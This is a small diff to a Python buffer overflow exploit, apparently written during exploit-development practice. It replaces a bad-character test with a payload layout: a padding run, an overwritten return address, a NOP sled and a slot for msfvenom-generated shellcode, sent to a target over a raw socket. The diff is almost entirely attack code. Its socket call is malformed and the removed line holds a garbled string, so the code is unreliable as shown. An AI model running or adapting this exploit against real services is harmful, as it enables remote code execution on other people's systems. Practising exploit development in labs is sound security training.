@@ -2,9 +2,14 @@
 
 import sys, socket
 
-badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16 continues in hex to f")
+overflow = (
+# Paste response from msfvenom
+)
 
-shellcode = "A" * 2003 + "B" * 4 + badchars
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
+
+# input pointer but in weird reverse format
+# 32 is a knot, add a bit of padding between chars and overflow
 
 try:
     s=socket.socket(socket.AF_INET.socket.SOCK_STREAM
